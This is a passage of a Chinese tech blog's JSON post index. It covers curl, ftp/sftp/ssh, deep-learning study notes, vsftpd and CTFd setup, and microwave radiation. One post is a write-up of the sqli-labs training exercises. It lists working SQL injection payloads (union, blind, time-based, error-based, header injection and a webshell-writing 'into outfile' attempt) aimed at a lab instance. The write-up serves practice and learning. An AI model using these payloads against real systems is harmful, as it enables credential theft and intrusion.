&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot; https://www.xxx.com注：若留空则移除User-Agent标头跟随重定向：curl -L https://www.xxx.com注：curl默认不跟随重定向发送cookie：curl -b &quot;foo=bar&quot; https://www.xxx.comurl编码：curl --data-urlencode &quot;xxxxxxx&quot; https://www.xxx.com注：该方式与-d相近，区别在于是否编码保存网页(与wget相似)：curl -o xxx.html https://www.xxx.com用户认证：curl -u &quot;user:passwd&quot; https://www.xxx.com/login输出通信过程：curl -v https://www.xxx.com输出二进制数据：curl --trace - https://www.xxx.com注：可配合-o导出 quotehttps://www.jianshu.com/p/fc0eb6c60816https://www.ruanyifeng.com/blog/2019/09/curl-reference.html","categories":[],"tags":[{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"}]},{"title":"ftp,sftp与ssh之间的关系","slug":"ftp_sftp_ssh","date":"2022-03-06T03:27:06.551Z","updated":"2022-03-06T05:24:37.416Z","comments":true,"path":"2022/03/06/ftp_sftp_ssh/","link":"","permalink":"http://uniqueland.top/2022/03/06/ftp_sftp_ssh/","excerpt":"ftp和sftp的区别这两种协议都是用于传输文件的，其中sftp是基于ssh的原理","text":"ftp和sftp的区别这两种协议都是用于传输文件的，其中sftp是基于ssh的原理开发的 ftp: File Transfer Protocolstfp: Secure File Transfer Protocol / SSH File Transfer Protocolssh: Secure Shell ftpftp是明文传输，有两种模式：主动模式和被动模式 主动模式(Positive Mode)：在该模式下，服务端开放21，20端口；21端口用于接收用户名和密码，20端口用于传输数据客户端登录ftp服务器后随机开放一个端口，再将这个端口的信息发送给服务端，服务端再通过用于传输数据的20端口连接至用户提供的端口 被动模式(Passive Mode)：在该模式下，服务端开放用于客户端连接的21端口以及一个随机端口，而客户端在登录ftp服务器后接收服务端提供的随机端口的信息，再连接至服务端的该端口以传输数据 stfp 首先要明确的一点是，stfp是ssh的一个子服务 sftp是基于ssh的技术进行文件的传输的，而ssh是通过22端口进行通信的，也就是说sftp也是通过22端口进行通信以及数据传输的，与ftp协议相比，除了通信端口的不同，由于ssh的通信过程是加密的，所以sftp中文件的传输也是加密的，但实际的安全性还取决于ssh的连接方式；且在ssh服务器与通信主机（服务器）分开时还分有半安全模式(Less Secure Connection)和安全模式(Full Secure Connection) 半安全模式指用户通过ssh连接ssh服务器时所有的数据都是加密的，而ssh服务器与主机间通信的数据是未加密的 安全模式指用户与ssh服务器以及ssh服务器与主机间的通信都是加密的 而当ssh服务运行于目标主机上时便不存在半安全模式和安全模式之分了 ssh作为远程连接主机的常用方式，ssh有两种连接方式，一种是通过用户名和密码进行通信，这种方式非常方便，只需要任意一台能够接入互联网的常用设备就能够连接上远程主机，但是这种方式存在受到中间人攻击的可能；另一种方式是通过密钥分发的方式，即在服务端生成一份私钥存于服务器，再生成一份公钥分发给需要通信的主机，这种方式不需要用户名和密码，并且通信时需要进行密钥与公钥的验证，基本杜绝了中间人攻击的可能，但是由于需要提前准备好公钥，故便携性不如第一种方式 quotehttps://network.51cto.com/article/603552.htmlhttps://www.zhihu.com/question/20402010https://blog.csdn.net/cuker919/article/details/6403925","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"Deep Learning from Scratch 5","slug":"deep_learning_from_scratch_5","date":"2021-12-25T08:05:51.980Z","updated":"2021-12-25T08:44:21.959Z","comments":true,"path":"2021/12/25/deep_learning_from_scratch_5/","link":"","permalink":"http://uniqueland.top/2021/12/25/deep_learning_from_scratch_5/","excerpt":"深度学习应用案例","text":"深度学习应用案例 物体检测 – R-CNN 图像分割 – FCN 图像标题的生成 – NIC (CNN+RNN) 图像风格变换 图像的生成 – DCGAN 自动驾驶 Dep Q-Network (强化学习) 多模态处理 组合图像和自然语言等多种信息进行的处理 GAN 生成式对抗网络（GAN, Generative Adversarial Networks ）是一种深度学习模型，是近年来复杂分布上无监督学习最具前景的方法之一。模型通过框架中（至少）两个模块：生成模型（Generative Model）和判别模型（Discriminative Model）的互相博弈学习产生相当好的输出。原始 GAN 理论中，并不要求 G 和 D 都是神经网络，只需要是能拟合相应生成和判别的函数即可。但实用中一般均使用深度神经网络作为 G 和 D 。 –Baidu Baike","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"Deep Learning from Scratch 4","slug":"deep_learning_from_scratch_4","date":"2021-12-18T13:14:56.550Z","updated":"2021-12-19T03:18:49.592Z","comments":true,"path":"2021/12/18/deep_learning_from_scratch_4/","link":"","permalink":"http://uniqueland.top/2021/12/18/deep_learning_from_scratch_4/","excerpt":"卷积神经网络与普通机器学习的区别","text":"卷积神经网络与普通机器学习的区别 CNN中新出现了卷积层和池化层 全连接层存在的问题在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系 特征图卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图 卷积运算卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等 填充向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0 作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要填充来调整数据空间大小 步幅 应用滤波器的位置间隔 3维数据的卷积运算与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加 池化层池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等 特征 没有要学习的参数 通道数不发生变化 对微小的位置变化具有鲁棒性（健壮） 具有代表性的CNN LeNet 是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果 不同点 激活函数不同 LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数 在缩小中间数据的大小时采用的方法不同 原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化 AlexNet 在结构上与LeNet基本没有什么不同 与LeNet的差异 激活函数使用ReLU 使用进行局部正规化的LRN(Local Response Normalization)层 使用Dropout Data Augmentation(数据扩充)基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量 加深层的好处 减少网络的参数数量 与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力 使学习更加高效 随着层的加深，神经元会对更复杂的东西有响应 可以分层次地分解需要学习的问题 可以分层次地传递信息 感受野(receptive field)给神经元施加变化的某个局部空间区域 ImageNet一个拥有超过100万张图像的数据集 在深度学习中比较知名的网络 VGG GoogLeNet ResNet 深度学习中高速化的问题在深度学习中大部分时间都耗费在卷积层上 基于GPU的高速化深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度 分布式学习为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"ftp文件服务器搭建","slug":"ftp_server","date":"2021-12-16T15:03:06.120Z","updated":"2021-12-16T15:15:51.555Z","comments":true,"path":"2021/12/16/ftp_server/","link":"","permalink":"http://uniqueland.top/2021/12/16/ftp_server/","excerpt":"第一步：更新软件列表","text":"第一步：更新软件列表 1234567891011121314zh@ubuntu:~$ sudo apt update[sudo] password for zh: Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InReleaseGet:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB] Fetched 2,615 kB in 10s (271 kB/s) Reading package lists... DoneBuilding dependency tree Reading state information... Done49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them. 第二步：安装vsftpd1234567891011121314151617181920212223242526272829303132zh@ubuntu:~$ sudo apt install vsftpdReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following additional packages will be installed: ssl-certSuggested packages: openssl-blacklistThe following NEW packages will be installed: ssl-cert vsftpd0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.Need to get 132 kB of archives.After this operation, 402 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]Fetched 132 kB in 3s (50.0 kB/s) Preconfiguring packages ...Selecting previously unselected package ssl-cert.(Reading database ... 71512 files and directories currently installed.)Preparing to unpack .../ssl-cert_1.0.39_all.deb ...Unpacking ssl-cert (1.0.39) Selecting previously unselected package vsftpd..............................................................................] Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] Setting up ssl-cert (1.0.39) ...#################################...........................................................] Progress: [ 56%] [##########################################################................................................] Setting up vsftpd (3.0.3-12) ...########################################################....................................] Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] Processing triggers for man-db (2.9.1-1) Processing triggers for systemd (245.4-4ubuntu3.11) ... 第三步：添加用户123456zh@ubuntu:~$ sudo nano /etc/vsftpd.confzh@ubuntu:~$ sudo useradd -m ftpuserzh@ubuntu:~$ sudo passwd ftpuserNew password: Retype new password: passwd: password updated successfully 第四步：测试1root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"}]},{"title":"Deep Learning from Scratch 3","slug":"deep_learning_from_scratch_3","date":"2021-12-11T08:29:42.485Z","updated":"2021-12-12T01:39:50.058Z","comments":true,"path":"2021/12/11/deep_learning_from_scratch_3/","link":"","permalink":"http://uniqueland.top/2021/12/11/deep_learning_from_scratch_3/","excerpt":"误差反向传播法","text":"误差反向传播法 Affine 层（仿射变换） 神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换” ​ 注：在affine层的反向传播过程中要注意矩阵形状 梯度确认(gradient check) 确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作 ​ 用于确认误差反向传播法的实现是否正确 与学习相关的技巧最优化 解决“寻找最优参数的问题”的过程 SGD $$W= W-η\\frac{\\partial L}{\\partial W}$$ 缺点 如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效 抵消的根本原因：梯度的方向并没有指向最小值的方向 Momentum $$v=\\alpha v - \\eta \\frac{\\partial L}{\\partial W}$$ $$W=W+v$$ AdaGrad $$h=h+\\frac{\\partial L}{\\partial W} .\\frac{\\partial L}{\\partial W}$$ $$W=W-\\eta \\frac{1}{h^{\\frac{1}{2}}}\\frac{\\partial L}{\\partial W}$$ ​ AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零 Adam 融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索 特征：超参数的“偏置校正” 权重的初始值​ 将权重设置为0的问题 ​ 如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构） 梯度消失（梯度爆炸）在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了梯度消失现象，如果是往大了变，就出现了梯度爆炸现象 表现力受限当传递给神经元的是有所偏向的数据时，有可能会出现表现力受限的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义 Xavier初始值 如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布 ReLU的权重初始值 当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值” He初始值使用标准差为(2/n)^(1/2)的高斯分布 Batch Nomalization (Batch Norm) 以进行学习时的mini-batch为单位，按mini-batch进行正规化 进行使数据分布的均值为0，方差为1的正规化$$\\mu B=\\frac{1}{m}\\Sigma^m{i=1}x_i$$ $$\\sigma ^2_B=\\frac{1}{m}\\Sigma^m_{i=1}(x_i-\\mu_B)^2$$ $$x_i=\\frac{x_i-\\mu_B}{\\sqrt{\\sigma_B^2+\\epsilon}}$$ 优点： 可以使学习快速进行（可以增大学习率） 不那么依赖初始值（对于初始值不用那么神经质） 抑制过拟合（降低Dropou等的必要性） 过拟合 只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态 原因 模型拥有大量参数，表现力强 训练数据少 权值衰减 通过在学习的过程中对大的权重进行惩罚，来抑制过拟合 例：为损失函数加上权重的平方范数（1/2λW^2） Dropout Dropout是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"微波炉究竟有没有辐射","slug":"microwave_oven","date":"2021-11-30T15:24:20.874Z","updated":"2021-12-06T15:39:31.281Z","comments":true,"path":"2021/11/30/microwave_oven/","link":"","permalink":"http://uniqueland.top/2021/11/30/microwave_oven/","excerpt":"震惊！这个常见的家用电器竟有这么大的辐射","text":"震惊！这个常见的家用电器竟有这么大的辐射 直奔主题，微波炉对人体究竟会不会产生危害要知道微波炉是否会对人体产生危害，就得先知道什么程度的微波会对人体产生危害 可以看出，只要50mm以外泄露的微波小于等于50W/m^2，就不会对人体造成影响，而市面上的绝大多数微波炉也都满足这一标准，即使在使用了一段时间后，虽然门把手及炉门密封处微波泄漏量略有上升，但也都在标准以内 顺便说一声，微波炉的产生的辐射属于非电离辐射，并不能破坏分子结构和产生电离作用；频率在2.45GHz左右，也就WIFI的频率，而且微波炉是在金属容器中工作的，这些金属容器能够很好地限制微波 所以，微波炉不会对人体造成伤害 问题解答微波炉泄漏的辐射会致畸？ 点击查看答案 同样是2.45GHz左右的频率，既然WIFI没有致畸作用，想必微波炉也不具备这样的能力 微波炉加热食物会产生致癌物质？ 点击查看答案 想知道是否致癌，得从微波炉加热的本质说起微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质 微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？ 点击查看答案 来人，上公式可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来 微波炉加热的食品，会不会改变食品本身的营养成分？ 点击查看答案 我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。 资料参考： 求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn) 老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com) 部分图源必应，侵删","categories":[],"tags":[{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"}]},{"title":"sqli-labs","slug":"sqli-labs","date":"2021-11-30T05:33:41.039Z","updated":"2022-01-02T03:04:14.353Z","comments":true,"path":"2021/11/30/sqli-labs/","link":"","permalink":"http://uniqueland.top/2021/11/30/sqli-labs/","excerpt":"用校园网可能不能成功发送payload，切记！！！","text":"用校园网可能不能成功发送payload，切记！！！ Less-01 先判断是字符型注入还是数字型注入 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1 and 1=2–+ 再判断注入点 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,2,3–+ 查看数据库名称 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,database(),3–+ 查看库中的表 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 查看用户表中字段 payload：http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+ 查看用户名和密码 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username,password),3 from security.users–+ 换个方式显示 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users–+ Less-02 判断是数字型注入还是字符型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1 判断注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+ 往下操作与第一题类似，payload就差了一个单引号 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-03 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1 该题为字符型注入，但直接使用联合注入报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+ 根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+ 往下与第一题相同，union后的payload一致 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-04 判断为字符型注入还是数字型注入 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1 使用单引号进行闭合，报错 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+ 组合单引号、双引号以及括号得到注入点 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;) union select 1,2,3–+ 往下步骤与上述题目相同 payload：http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-05 判断为字符型注入还是数字型注入 回显报错数据，尝试盲注 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+ 对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名 payload：http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+ 列名以此类推 可以用python写个脚本来跑，或者使用burpsuite 另外，还可以使用updataxml()函数来获取相关信息 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+ Less-06与上一道题类似，将单引号换为双引号 Less-07 利用永真永假的条件配合and和or判断参数id的闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+ 利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;)) union select 1,’2’,”“ into outfile “./“ –+ 由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断 Less-08 判断参数闭合方式 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+ 由于注入错误时不回显，因此可以使用上述的盲注 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ 往后步骤与上述盲注步骤一致 Less-09 在判断参数闭合方式时，发现回显不改变 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+ 尝试基于时间的盲注 可以看到网页根据设定的时间正在加载，说明注入成功 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+ 接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果 payload取上述盲注payload的查询部分 payload：http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+ Less-10 将闭合参数的单引号替换为双引号，其余一致 Less-11这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意 不可以直接将url编码之后的数据（如%20）直接提交 最后的注释不可以用“–+”，而应该用“#” 上面这样注释是行不通的，用“#”代替“–+”之后如下图 然后再用之前写过的题当中出现的联合注入 Less-12原理同上一题一致，唯一差别是闭合方式不同 less-13这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分 下图是联合注入后无回显的结果 这里使用了报错注入返回了mysql的绝对路径 payload：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# 这里查询到了当前的数据库 需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整 payload：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)# Less-14这道题与上一道题类似，唯一不同的仍是闭合方式不同 Less-15这道题考察的是post方式的基于时间的盲注 一开始依然先判断闭合方式 然后用if语句构造基于时间的盲注 这里无需关注是否登录成功，只需关注响应时间 然后根据上述题目中有关基于时间的盲注有关的题目的payload进行注入 payload：1’ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=’c’),sleep(2),1) # Less-16这道题与上一道题目差不多，唯一区别仍是闭合方式不同 Less-17这道题涉及到了sql语句中update部分，模拟的是在登录成功后修改密码时的注入 这里由于无法回显闭合方式是否正确，故使用基于时间的盲注中的小技巧进行判断 往下的过程涉及到子查询的概念，即以查询的结果作为下一次查询的范围 查数据库 往后只需将select database()替换为先前题目中相应的payload即可 Less-18一开始给出了本机的ip地址，意义不明（估计是提示可以注入某些类型的信息以执行） 再经过对username和password的多次注入后发现没有什么效果，尝试登录 可以看出登录后回显了user agent，则可以通过抓包修改user agent的方式注入 payload：’and updatexml(1,concat(0x7e,database(),0x7e),1) or ‘ Less-19这道题与上一道差不多，只不过修改的是Referer字段 payload：与上一道题一致","categories":[],"tags":[{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"}]},{"title":"Deep Learning from Scratch 2","slug":"deep_learning_from_scratch_2","date":"2021-11-29T14:46:25.122Z","updated":"2021-12-05T02:56:57.166Z","comments":true,"path":"2021/11/29/deep_learning_from_scratch_2/","link":"","permalink":"http://uniqueland.top/2021/11/29/deep_learning_from_scratch_2/","excerpt":"在”手写数字识别”中","text":"在”手写数字识别”中 了解到了mnist数据集 对运算过程中运算的具体对象有点问题 1234567891011import sys, ossys.path.append(os.pardir)from dataset.mnist import load_mnist(x_train, t_train), (x_test, t_test) = load_mnist(flatten=True, normalize=False) #一开始不知道这是什么意思print(x_train.shape)print(t_train.shape)print(x_test.shape)print(t_test.shape) 对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了 x_train 是训练用的图像数据 t_train 是训练图像的解，即每个图像对应的数字 x_test 是用于测试的图像数据 t_test 是测试图像的解，即每个图像对应的数字 认识了正规化、预处理和 one-hot 表示法 正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算 预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等 one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y) 12345for i in range(len(x)): y = predict(network, x[i]) p= np.argmax(y) # 获取概率最高的元素的索引 if p == t[i]: accuracy_cnt += 1 另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系 输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小 输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十 在“从数据中学习”中 认识了许多概念 特征量 特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式 特征量是由人设计的 不同问题对应不同特征量 深度学习中特征量是由机器来学习的 泛化能力 泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力 过拟合 只对某个数据集过度拟合的状态称为过拟合 可以理解为训练的模型只对某个数据集起作用 损失函数 损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致 均方误差$$E=\\frac{1}{2}\\Sigma_k(y_k-t_k)^2$$ 这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数 交叉熵误差$$E=-\\Sigma_kt_k\\log{y_k}$$ 损失函数的意义个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果 数值微分 利用某个给定的微小值的差分求导数的过程，称为数值微分 导数与偏导数的定义 梯度及梯度法 梯度法：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值 学习算法（随机梯度下降法）的实现神经网络的学习步骤： 前提 神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习” 步骤1（mini-batch） 从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值 步骤2（计算梯度） 为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向 步骤3（更新参数） 将权重参数沿梯度方向进行微小更新 步骤4（重复） 重复步骤1、步骤2、步骤3 epoch： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数 误差方向传播法计算图了解正向传播、反向传播及局部计算的定义 链式法则复合函数导数的定义 如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示 链式法则是关于复合函数的导数的性质 反向传播反向传播的计算顺序 先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点 加法节点的反向传播 加法节点的反向传播只乘以1 乘法节点的反向传播 乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游 对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"CTFd搭建","slug":"ctf_contest_platform_build","date":"2021-11-28T09:32:15.439Z","updated":"2021-11-28T09:35:07.152Z","comments":true,"path":"2021/11/28/ctf_contest_platform_build/","link":"","permalink":"http://uniqueland.top/2021/11/28/ctf_contest_platform_build/","excerpt":"CTF比赛平台搭建","text":"CTF比赛平台搭建 克隆CTFdGitHub：https://github.com/CTFd/CTFd 123456789┌──(kali㉿kali)-[/var/www/html]└─$ sudo git clone https://github.com/CTFd/CTFd.git 128 ⨯Cloning into &#x27;CTFd&#x27;...remote: Enumerating objects: 14012, done.remote: Counting objects: 100% (869/869), done.remote: Compressing objects: 100% (555/555), done.remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 